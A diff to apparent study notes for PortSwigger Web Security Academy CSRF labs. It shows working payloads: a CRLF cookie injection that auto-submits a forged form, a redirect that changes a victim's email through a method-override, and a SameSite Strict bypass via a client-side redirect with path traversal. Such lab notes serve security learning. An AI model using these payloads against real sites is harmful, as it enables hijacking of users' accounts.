@@ -15,18 +15,22 @@
  \<input type="hidden" name="csrf" value="fake" />
  ...
   Remove the auto-submit \<script> block and instead add the following code to inject the cookie and submit the form:
-```
-  <img src="https://lab_id.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
 
+ ` <img src="https://lab_id.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>`
+  
+
+```
 <script>
   document.location = "https://lab_id.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
 </script>
-
 ```
+
+
+
 - ==SameSite Strict bypass via client-side redirect== E.G /resources/js/commentConfirmationRedirect.js. - No CSRF Token
 ``` 
 <script>
-document.location="https://lab.com//post/comment/confirmation%3fpostId%3d../my-account/change-email%3femail%3dtesting%40test.com%26submit"
+document.location="https://lab.com/post/comment/confirmation%3fpostId%3d../my-account/change-email%3femail%3dtesting%40test.com%26submit"
 </script>
 ```
 
